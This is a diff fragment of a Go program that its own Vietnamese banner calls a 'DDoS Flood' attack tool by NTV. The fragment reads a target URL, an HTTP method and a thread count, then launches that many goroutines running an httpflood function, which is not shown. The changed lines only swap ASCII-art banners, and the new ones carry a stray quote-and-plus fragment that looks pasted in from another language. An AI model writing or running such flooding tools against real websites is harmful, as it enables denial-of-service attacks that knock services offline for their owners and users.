@@ -32,15 +32,15 @@ func main(){
   target.url = os.Args[1]
   target.method = os.Args[2]
   threads, _ := strconv.Atoi(os.Args[3])
-  log.Print("Đang Khởi Động")
-  fmt.Print(" [..              [..") 
-  fmt.Print(" [..              [.. ")
-  fmt.Print(" [..[.. [..       [..[. [...   [.. ") 
-  fmt.Print(" [.. [..  [.. [.. [.. [..    [..  [..") 
-  fmt.Print(" [.. [..  [..[.   [.. [..   [..   [..")
-  fmt.Print(" [.. [..  [..[.   [.. [..   [..   [..") 
-  fmt.Print(" [..[...  [.. [.. [..[...     [.. [...")
-  fmt.Print("              Tấn Công DDoS Flood By NTV ")
+  log.Print("Được Tính Theo Giờ UTC")
+  fmt.Print("\033[31m' + '::::::::::: ::::    ::: :::::::::  :::::::::      :::   ") 
+  fmt.Print("\033[31m' + '    :+:     :+:+:   :+: :+:    :+: :+:    :+:   :+: :+: ")
+  fmt.Print("\033[31m' + '    +:+     :+:+:+  +:+ +:+    +:+ +:+    +:+  +:+   +:+") 
+  fmt.Print("\033[31m' + '    +#+     +#+ +:+ +#+ +#+    +:+ +#++:++#:  +#++:++#++:") 
+  fmt.Print("\033[31m' + '    +#+     +#+  +#+#+# +#+    +#+ +#+    +#+ +#+     +#+")
+  fmt.Print("\033[31m' + '    #+#     #+#   #+#+# #+#    #+# #+#    #+# #+#     #+#") 
+  fmt.Print("\033[31m' + '########### ###    #### #########  ###    ### ###     ###")
+  fmt.Print("\033[31m' + '   Đang Tấn Công DDoS Flood By NTV ")
    for i:=0; i < threads; i++{
      go httpflood()
    }
